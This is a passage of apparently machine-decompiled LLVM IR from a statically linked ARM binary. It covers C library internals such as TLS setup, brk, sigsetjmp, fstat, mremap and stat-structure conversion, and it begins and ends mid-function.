  uselistorder i32 %v0_2d268, { 1, 2, 0, 3 }
  uselistorder i32 %v2_2d25c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 1, 0, 2, 3 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 27984, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_2d434, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_2d304, { 1, 0 }
  uselistorder label %dec_label_pc_2d300, { 1, 0 }
  uselistorder label %dec_label_pc_2d284, { 1, 0 }
}

define i32 @function_2d454(i32 %arg1) local_unnamed_addr {
dec_label_pc_2d454:
  %v0_2d454 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2d454, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_2d454
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_2d454, %bb
  %v10_2d474 = phi i32 [ %arg1, %dec_label_pc_2d454 ], [ 0, %bb ]
  ret i32 %v10_2d474

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_2d480 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_2d480
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v4_2d490 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 172) to i32*), align 4
  %v4_2d498 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 116) to i32*), align 4
  store i32 %v4_2d498, i32* %r1.global-to-local, align 4
  %v1_2d49c = add i32 %arg1, 44
  %v2_2d49c = inttoptr i32 %v1_2d49c to i32*
  %v3_2d49c = load i32, i32* %v2_2d49c, align 4
  %v1_2d4a0 = add i32 %arg1, 28
  %v2_2d4a0 = inttoptr i32 %v1_2d4a0 to i32*
  %v3_2d4a0 = load i32, i32* %v2_2d4a0, align 4
  store i32 %v3_2d4a0, i32* %r2.global-to-local, align 4
  %v2_2d4a4 = inttoptr i32 %v4_2d490 to i32*
  store i32 %v3_2d49c, i32* %v2_2d4a4, align 4
  %v0_2d4a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d4a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_2d4a8 = inttoptr i32 %v1_2d4a8 to i32*
  store i32 %v0_2d4a8, i32* %v2_2d4a8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 172) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_2d4b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_2d4b4:
  %v0_2d4b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2d4b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2d4b4
  %v2_2d4b4 = load i32, i32* @ip, align 4
  %v5_2d4b4 = udiv i32 %v2_2d4b4, 2
  %v6_2d4b4 = and i32 %v5_2d4b4, %arg1
  %v2_2d4b8 = load i32, i32* @r4, align 4
  %v4_2d4b8 = lshr i32 %v2_2d4b8, %v6_2d4b4
  %v5_2d4b8 = sub nsw i32 32, %v6_2d4b4
  %v6_2d4b8 = shl i32 %v2_2d4b8, %v5_2d4b8
  %v7_2d4b8 = or i32 %v6_2d4b8, %v4_2d4b8
  %v9_2d4b8 = and i32 %v7_2d4b8, %v6_2d4b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2d4b4, %bb
  %v10_2d4b8 = phi i32 [ %arg1, %dec_label_pc_2d4b4 ], [ %v9_2d4b8, %bb ]
  ret i32 %v10_2d4b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_2d4c4 = add i32 %arg1, 40
  store i32 %v1_2d4c4, i32* %r2.global-to-local, align 4
  %v1_2d4c8 = inttoptr i32 %v1_2d4c4 to i32*
  %v2_2d4c8 = load i32, i32* %v1_2d4c8, align 4
  store i32 %v2_2d4c8, i32* %r2.global-to-local, align 4
  %v3_2d4c8 = add i32 %arg1, 44
  %v4_2d4c8 = inttoptr i32 %v3_2d4c8 to i32*
  %v5_2d4c8 = load i32, i32* %v4_2d4c8, align 4
  store i32 %v5_2d4c8, i32* %r3.global-to-local, align 4
  %v0_2d4cc = call i32 @__aeabi_read_tp()
  %v1_2d4d0 = inttoptr i32 %v0_2d4cc to i32*
  %v2_2d4d0 = load i32, i32* %v1_2d4d0, align 4
  store i32 %v2_2d4d0, i32* %r1.global-to-local, align 4
  %v3_2d4d4 = mul i32 %v5_2d4c8, 8
  store i32 %v3_2d4d4, i32* %r3.global-to-local, align 4
  %v1_2d4d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d4d8 = add i32 %v1_2d4d8, %v0_2d4cc
  %v3_2d4dc = add i32 %v3_2d4d4, %v2_2d4d0
  %v4_2d4dc = inttoptr i32 %v3_2d4dc to i32*
  store i32 %v2_2d4d8, i32* %v4_2d4dc, align 4
  %v0_2d4e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2d4e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_2d4e0 = add i32 %v1_2d4e0, %v0_2d4e0
  store i32 %v2_2d4e0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_2d4e8 = add i32 %v2_2d4e0, 4
  %v5_2d4e8 = inttoptr i32 %v4_2d4e8 to i8*
  store i8 1, i8* %v5_2d4e8, align 1
  %v0_2d4ec = load i32, i32* @r4, align 4
  %v1_2d4ec = add i32 %v0_2d4ec, 20
  store i32 %v1_2d4ec, i32* %r1.global-to-local, align 4
  %v1_2d4f0 = inttoptr i32 %v1_2d4ec to i32*
  %v2_2d4f0 = load i32, i32* %v1_2d4f0, align 4
  store i32 %v2_2d4f0, i32* @r1, align 4
  %v3_2d4f0 = add i32 %v0_2d4ec, 24
  %v4_2d4f0 = inttoptr i32 %v3_2d4f0 to i32*
  %v5_2d4f0 = load i32, i32* %v4_2d4f0, align 4
  store i32 %v5_2d4f0, i32* %r2.global-to-local, align 4
  %v5_2d4f4 = call i32 @__GI_mempcpy(i32 %v2_2d4d8, i32 %v2_2d4f0, i32 %v5_2d4f0, i32 1)
  %v0_2d4f8 = load i32, i32* @r4, align 4
  %v1_2d4f8 = add i32 %v0_2d4f8, 28
  store i32 %v1_2d4f8, i32* %r3.global-to-local, align 4
  %v1_2d4fc = inttoptr i32 %v1_2d4f8 to i32*
  %v2_2d4fc = load i32, i32* %v1_2d4fc, align 4
  store i32 %v2_2d4fc, i32* %r2.global-to-local, align 4
  %v3_2d4fc = add i32 %v0_2d4f8, 24
  %v4_2d4fc = inttoptr i32 %v3_2d4fc to i32*
  %v5_2d4fc = load i32, i32* %v4_2d4fc, align 4
  store i32 %v5_2d4fc, i32* %r3.global-to-local, align 4
  %v2_2d500 = sub i32 %v5_2d4fc, %v2_2d4fc
  store i32 %v2_2d500, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_2d508 = inttoptr i32 %v5_2d4f4 to i8*
  %v4_2d508 = call i32 @__GI_memset(i8* %v3_2d508, i32 0, i32 %v2_2d500)
  ret i32 %v4_2d508

; uselistorder directives
  uselistorder i32 %v3_2d4d4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 5, 4, 1, 6, 0, 24, 25, 22, 23, 20, 21, 19, 17, 18, 16, 13, 14, 15, 10, 11, 8, 9, 2, 3, 12, 7, 26 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_2d558:
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 28812) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_2d56c = load i32, i32* @r0, align 4
  %v1_2d570 = inttoptr i32 %v0_2d56c to i32*
  %v2_2d570 = load i32, i32* @r4, align 4
  store i32 %v2_2d570, i32* %v1_2d570, align 4
  %v3_2d570 = add i32 %v0_2d56c, 4
  %v4_2d570 = inttoptr i32 %v3_2d570 to i32*
  %v5_2d570 = load i32, i32* @r5, align 4
  store i32 %v5_2d570, i32* %v4_2d570, align 4
  %v6_2d570 = add i32 %v0_2d56c, 8
  %v7_2d570 = inttoptr i32 %v6_2d570 to i32*
  %v8_2d570 = load i32, i32* @r6, align 4
  store i32 %v8_2d570, i32* %v7_2d570, align 4
  %v9_2d570 = add i32 %v0_2d56c, 12
  %v10_2d570 = inttoptr i32 %v9_2d570 to i32*
  %v11_2d570 = load i32, i32* @r7, align 4
  store i32 %v11_2d570, i32* %v10_2d570, align 4
  %v12_2d570 = add i32 %v0_2d56c, 16
  %v13_2d570 = inttoptr i32 %v12_2d570 to i32*
  %v14_2d570 = load i32, i32* @r8, align 4
  store i32 %v14_2d570, i32* %v13_2d570, align 4
  %v15_2d570 = add i32 %v0_2d56c, 20
  %v16_2d570 = inttoptr i32 %v15_2d570 to i32*
  %v17_2d570 = load i32, i32* @sb, align 4
  store i32 %v17_2d570, i32* %v16_2d570, align 4
  %v18_2d570 = add i32 %v0_2d56c, 24
  %v19_2d570 = inttoptr i32 %v18_2d570 to i32*
  %v20_2d570 = load i32, i32* @sl, align 4
  store i32 %v20_2d570, i32* %v19_2d570, align 4
  %v21_2d570 = add i32 %v0_2d56c, 28
  %v22_2d570 = inttoptr i32 %v21_2d570 to i32*
  %v23_2d570 = load i32, i32* @fp, align 4
  store i32 %v23_2d570, i32* %v22_2d570, align 4
  %v24_2d570 = add i32 %v0_2d56c, 32
  %v25_2d570 = inttoptr i32 %v24_2d570 to i32*
  %v27_2d570 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_2d570, i32* %v25_2d570, align 4
  %v28_2d570 = add i32 %v0_2d56c, 36
  %v29_2d570 = inttoptr i32 %v28_2d570 to i32*
  %v30_2d570 = load i32, i32* @lr, align 4
  store i32 %v30_2d570, i32* %v29_2d570, align 4
  %v0_2d574 = call i32 @__sigjmp_save()
  ret i32 %v0_2d574

; uselistorder directives
  uselistorder i32 %v0_2d56c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_2d580 = load i32, i32* @r1, align 4
  store i32 %v0_2d580, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_2d590 = load i32, i32* @r0, align 4
  store i32 %v0_2d590, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_2d590, -4095
  br i1 %tmp, label %dec_label_pc_2d5b8, label %dec_label_pc_2d59c

dec_label_pc_2d59c:                               ; preds = %entry
  %v0_2d5a0 = call i32 @__aeabi_read_tp()
  %v3_2d5a4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2d5a4 = sext i16 %v3_2d5a4 to i32
  store i32 %v4_2d5a4, i32* @r3, align 4
  %v0_2d5a8 = load i32, i32* @r2, align 4
  %v1_2d5a8 = sub i32 0, %v0_2d5a8
  store i32 %v1_2d5a8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_2d5b0 = add i32 %v4_2d5a4, %v0_2d5a0
  %v4_2d5b0 = inttoptr i32 %v3_2d5b0 to i32*
  store i32 %v1_2d5a8, i32* %v4_2d5b0, align 4
  br label %dec_label_pc_2d5c8

dec_label_pc_2d5b8:                               ; preds = %entry
  store i32 %v0_2d590, i32* %r7.global-to-local, align 4
  %v2_2d5b8 = icmp eq i32 %v0_2d590, 0
  br i1 %v2_2d5b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2d5b8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2d5b8, %bb
  call void @__pseudo_cond_branch(i1 %v2_2d5b8, i32 ptrtoint (i32* @global_var_2d6ec.3520 to i32))
  br label %dec_label_pc_2d5c8

dec_label_pc_2d5c8:                               ; preds = %dec_label_pc_2d59c, %.thread
  %v0_2d5c8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_2d5c8

; uselistorder directives
  uselistorder i32 %v0_2d590, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_2d5c8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2d5dc = load i32, i32* @r4, align 4
  store i32 %v3_2d5dc, i32* %stack_var_-12, align 4
  %v0_2d5ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2d5ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2d5ec, -4095
  br i1 %tmp, label %dec_label_pc_2d614, label %dec_label_pc_2d5fc

dec_label_pc_2d5fc:                               ; preds = %entry
  %v0_2d600 = call i32 @__aeabi_read_tp()
  %v3_2d604 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2d604 = sext i16 %v3_2d604 to i32
  %v0_2d608 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d608 = sub i32 0, %v0_2d608
  store i32 %v1_2d608, i32* %r2.global-to-local, align 4
  %v3_2d60c = add i32 %v4_2d604, %v0_2d600
  %v4_2d60c = inttoptr i32 %v3_2d60c to i32*
  store i32 %v1_2d608, i32* %v4_2d60c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2d614.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2d614

dec_label_pc_2d614:                               ; preds = %entry, %dec_label_pc_2d5fc
  %v1_2d618 = phi i32 [ %v0_2d5ec, %entry ], [ -1, %dec_label_pc_2d5fc ]
  %v2_2d614 = phi i32 [ %v3_2d5dc, %entry ], [ %v2_2d614.pre, %dec_label_pc_2d5fc ]
  store i32 %v2_2d614, i32* @r4, align 4
  ret i32 %v1_2d618

; uselistorder directives
  uselistorder i32 %v0_2d5ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d614, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_2d620 = load i32, i32* @r4, align 4
  store i32 %v3_2d620, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_2d638 = inttoptr i32 %arg2 to i8*
  %v4_2d638 = call i32 @__GI_memset(i8* %v3_2d638, i32 0, i32 104)
  %v2_2d63c = load i32, i32* %arg1, align 4
  store i32 %v2_2d63c, i32* %r3.global-to-local, align 4
  %v3_2d63c = add i32 %tmp, 4
  %v4_2d63c = inttoptr i32 %v3_2d63c to i32*
  %v5_2d63c = load i32, i32* %v4_2d63c, align 4
  store i32 %v5_2d63c, i32* %r4.global-to-local, align 4
  %v0_2d640 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d640 = inttoptr i32 %v0_2d640 to i32*
  store i32 %v2_2d63c, i32* %v1_2d640, align 4
  %v3_2d640 = add i32 %v0_2d640, 4
  %v4_2d640 = inttoptr i32 %v3_2d640 to i32*
  %v5_2d640 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d640, i32* %v4_2d640, align 4
  %v0_2d644 = load i32, i32* %r6.global-to-local, align 4
  %v1_2d644 = add i32 %v0_2d644, 12
  %v2_2d644 = inttoptr i32 %v1_2d644 to i32*
  %v3_2d644 = load i32, i32* %v2_2d644, align 4
  %v1_2d648 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d648 = add i32 %v1_2d648, 12
  %v3_2d648 = inttoptr i32 %v2_2d648 to i32*
  store i32 %v3_2d644, i32* %v3_2d648, align 4
  %v0_2d64c = load i32, i32* %r6.global-to-local, align 4
  %v1_2d64c = add i32 %v0_2d64c, 96
  store i32 %v1_2d64c, i32* %r3.global-to-local, align 4
  %v1_2d650 = inttoptr i32 %v1_2d64c to i32*
  %v2_2d650 = load i32, i32* %v1_2d650, align 4
  store i32 %v2_2d650, i32* %r3.global-to-local, align 4
  %v3_2d650 = add i32 %v0_2d64c, 100
  %v4_2d650 = inttoptr i32 %v3_2d650 to i32*
  %v5_2d650 = load i32, i32* %v4_2d650, align 4
  store i32 %v5_2d650, i32* %r4.global-to-local, align 4
  %v1_2d654 = add i32 %v0_2d64c, 56
  %v2_2d654 = inttoptr i32 %v1_2d654 to i32*
  %v3_2d654 = load i32, i32* %v2_2d654, align 4
  store i32 %v3_2d654, i32* %r2.global-to-local, align 4
  %v1_2d658 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d658 = add i32 %v1_2d658, 96
  %v3_2d658 = inttoptr i32 %v2_2d658 to i32*
  store i32 %v2_2d650, i32* %v3_2d658, align 4
  %v0_2d65c = load i32, i32* %r4.global-to-local, align 4
  %v1_2d65c = load i32, i32* %r5.global-to-local, align 4
  %v2_2d65c = add i32 %v1_2d65c, 100
  %v3_2d65c = inttoptr i32 %v2_2d65c to i32*
  store i32 %v0_2d65c, i32* %v3_2d65c, align 4
  %v0_2d660 = load i32, i32* %r6.global-to-local, align 4
  %v1_2d660 = add i32 %v0_2d660, 24
  store i32 %v1_2d660, i32* %ip.global-to-local, align 4
  %v1_2d664 = inttoptr i32 %v1_2d660 to i32*
  %v2_2d664 = load i32, i32* %v1_2d664, align 4
  store i32 %v2_2d664, i32* %ip.global-to-local, align 4
  %v3_2d664 = add i32 %v0_2d660, 28
  %v4_2d664 = inttoptr i32 %v3_2d664 to i32*
  %v5_2d664 = load i32, i32* %v4_2d664, align 4
  store i32 %v5_2d664, i32* %lr.global-to-local, align 4
  %v0_2d668 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d668 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d668 = add i32 %v1_2d668, 56
  %v3_2d668 = inttoptr i32 %v2_2d668 to i32*
  store i32 %v0_2d668, i32* %v3_2d668, align 4
  %v0_2d66c = load i32, i32* %r6.global-to-local, align 4
  %v1_2d66c = add i32 %v0_2d66c, 72
  store i32 %v1_2d66c, i32* %r3.global-to-local, align 4
  %v1_2d670 = add i32 %v0_2d66c, 32
  store i32 %v1_2d670, i32* %r7.global-to-local, align 4
  %v1_2d674 = inttoptr i32 %v1_2d670 to i32*
  %v2_2d674 = load i32, i32* %v1_2d674, align 4
  store i32 %v2_2d674, i32* %r7.global-to-local, align 4
  %v3_2d674 = add i32 %v0_2d66c, 36
  %v4_2d674 = inttoptr i32 %v3_2d674 to i32*
  %v5_2d674 = load i32, i32* %v4_2d674, align 4
  store i32 %v5_2d674, i32* %r8.global-to-local, align 4
  %v1_2d678 = inttoptr i32 %v1_2d66c to i32*
  %v2_2d678 = load i32, i32* %v1_2d678, align 4
  %v3_2d678 = add i32 %v0_2d66c, 76
  %v4_2d678 = inttoptr i32 %v3_2d678 to i32*
  %v5_2d678 = load i32, i32* %v4_2d678, align 4
  store i32 %v5_2d678, i32* %r1.global-to-local, align 4
  %v0_2d67c = load i32, i32* %r5.global-to-local, align 4
  %v1_2d67c = add i32 %v0_2d67c, 72
  %v1_2d680 = inttoptr i32 %v1_2d67c to i32*
  store i32 %v2_2d678, i32* %v1_2d680, align 4
  %v3_2d680 = add i32 %v0_2d67c, 76
  %v4_2d680 = inttoptr i32 %v3_2d680 to i32*
  %v5_2d680 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d680, i32* %v4_2d680, align 4
  %v0_2d684 = load i32, i32* %r7.global-to-local, align 4
  %v1_2d684 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d684 = add i32 %v1_2d684, 32
  %v3_2d684 = inttoptr i32 %v2_2d684 to i32*
  store i32 %v0_2d684, i32* %v3_2d684, align 4
  %v0_2d688 = load i32, i32* %r8.global-to-local, align 4
  %v1_2d688 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d688 = add i32 %v1_2d688, 36
  %v3_2d688 = inttoptr i32 %v2_2d688 to i32*
  store i32 %v0_2d688, i32* %v3_2d688, align 4
  %v0_2d68c = load i32, i32* %r6.global-to-local, align 4
  %v1_2d68c = add i32 %v0_2d68c, 80
  store i32 %v1_2d68c, i32* %r3.global-to-local, align 4
  %v1_2d690 = add i32 %v0_2d68c, 48
  store i32 %v1_2d690, i32* %r7.global-to-local, align 4
  %v1_2d694 = inttoptr i32 %v1_2d690 to i32*
  %v2_2d694 = load i32, i32* %v1_2d694, align 4
  store i32 %v2_2d694, i32* %r7.global-to-local, align 4
  %v3_2d694 = add i32 %v0_2d68c, 52
  %v4_2d694 = inttoptr i32 %v3_2d694 to i32*
  %v5_2d694 = load i32, i32* %v4_2d694, align 4
  store i32 %v5_2d694, i32* %r8.global-to-local, align 4
  %v1_2d698 = inttoptr i32 %v1_2d68c to i32*
  %v2_2d698 = load i32, i32* %v1_2d698, align 4
  %v3_2d698 = add i32 %v0_2d68c, 84
  %v4_2d698 = inttoptr i32 %v3_2d698 to i32*
  %v5_2d698 = load i32, i32* %v4_2d698, align 4
  store i32 %v5_2d698, i32* %r1.global-to-local, align 4
  %v1_2d69c = add i32 %v0_2d68c, 16
  %v2_2d69c = inttoptr i32 %v1_2d69c to i32*
  %v3_2d69c = load i32, i32* %v2_2d69c, align 4
  store i32 %v3_2d69c, i32* %r2.global-to-local, align 4
  %v0_2d6a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d6a0 = add i32 %v0_2d6a0, 80
  %v1_2d6a4 = inttoptr i32 %v1_2d6a0 to i32*
  store i32 %v2_2d698, i32* %v1_2d6a4, align 4
  %v3_2d6a4 = add i32 %v0_2d6a0, 84
  %v4_2d6a4 = inttoptr i32 %v3_2d6a4 to i32*
  %v5_2d6a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d6a4, i32* %v4_2d6a4, align 4
  %v0_2d6a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_2d6a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6a8 = add i32 %v1_2d6a8, 48
  %v3_2d6a8 = inttoptr i32 %v2_2d6a8 to i32*
  store i32 %v0_2d6a8, i32* %v3_2d6a8, align 4
  %v0_2d6ac = load i32, i32* %r8.global-to-local, align 4
  %v1_2d6ac = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6ac = add i32 %v1_2d6ac, 52
  %v3_2d6ac = inttoptr i32 %v2_2d6ac to i32*
  store i32 %v0_2d6ac, i32* %v3_2d6ac, align 4
  %v0_2d6b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d6b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6b0 = add i32 %v1_2d6b0, 16
  %v3_2d6b0 = inttoptr i32 %v2_2d6b0 to i32*
  store i32 %v0_2d6b0, i32* %v3_2d6b0, align 4
  %v0_2d6b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_2d6b4 = add i32 %v0_2d6b4, 88
  store i32 %v1_2d6b4, i32* %r3.global-to-local, align 4
  %v1_2d6b8 = add i32 %v0_2d6b4, 20
  %v2_2d6b8 = inttoptr i32 %v1_2d6b8 to i32*
  %v3_2d6b8 = load i32, i32* %v2_2d6b8, align 4
  store i32 %v3_2d6b8, i32* %r2.global-to-local, align 4
  %v1_2d6bc = inttoptr i32 %v1_2d6b4 to i32*
  %v2_2d6bc = load i32, i32* %v1_2d6bc, align 4
  %v3_2d6bc = add i32 %v0_2d6b4, 92
  %v4_2d6bc = inttoptr i32 %v3_2d6bc to i32*
  %v5_2d6bc = load i32, i32* %v4_2d6bc, align 4
  store i32 %v5_2d6bc, i32* %r1.global-to-local, align 4
  %v1_2d6c0 = add i32 %v0_2d6b4, 64
  store i32 %v1_2d6c0, i32* %r6.global-to-local, align 4
  %v1_2d6c4 = inttoptr i32 %v1_2d6c0 to i32*
  %v2_2d6c4 = load i32, i32* %v1_2d6c4, align 4
  store i32 %v2_2d6c4, i32* %r6.global-to-local, align 4
  %v3_2d6c4 = add i32 %v0_2d6b4, 68
  %v4_2d6c4 = inttoptr i32 %v3_2d6c4 to i32*
  %v5_2d6c4 = load i32, i32* %v4_2d6c4, align 4
  store i32 %v5_2d6c4, i32* %r7.global-to-local, align 4
  %v0_2d6c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d6c8 = add i32 %v0_2d6c8, 88
  store i32 %v1_2d6c8, i32* %r3.global-to-local, align 4
  %v2_2d6cc = add i32 %v0_2d6c8, 20
  %v3_2d6cc = inttoptr i32 %v2_2d6cc to i32*
  store i32 %v3_2d6b8, i32* %v3_2d6cc, align 4
  %v0_2d6d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_2d6d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6d0 = add i32 %v1_2d6d0, 24
  %v3_2d6d0 = inttoptr i32 %v2_2d6d0 to i32*
  store i32 %v0_2d6d0, i32* %v3_2d6d0, align 4
  %v0_2d6d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_2d6d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6d4 = add i32 %v1_2d6d4, 28
  %v3_2d6d4 = inttoptr i32 %v2_2d6d4 to i32*
  store i32 %v0_2d6d4, i32* %v3_2d6d4, align 4
  %v0_2d6d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_2d6d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6d8 = add i32 %v1_2d6d8, 64
  %v3_2d6d8 = inttoptr i32 %v2_2d6d8 to i32*
  store i32 %v0_2d6d8, i32* %v3_2d6d8, align 4
  %v0_2d6dc = load i32, i32* %r7.global-to-local, align 4
  %v1_2d6dc = load i32, i32* %r5.global-to-local, align 4
  %v2_2d6dc = add i32 %v1_2d6dc, 68
  %v3_2d6dc = inttoptr i32 %v2_2d6dc to i32*
  store i32 %v0_2d6dc, i32* %v3_2d6dc, align 4
  %v0_2d6e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2d6e0 = inttoptr i32 %v0_2d6e0 to i32*
  store i32 %v2_2d6bc, i32* %v1_2d6e0, align 4
  %v3_2d6e0 = add i32 %v0_2d6e0, 4
  %v4_2d6e0 = inttoptr i32 %v3_2d6e0 to i32*
  %v5_2d6e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d6e0, i32* %v4_2d6e0, align 4
  %v2_2d6e4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2d6e4, i32* %r4.global-to-local, align 4
  ret i32 %v2_2d6bc

; uselistorder directives
  uselistorder i32 %v0_2d6b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_2d68c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 0, 4, 1, 2, 3, 6, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
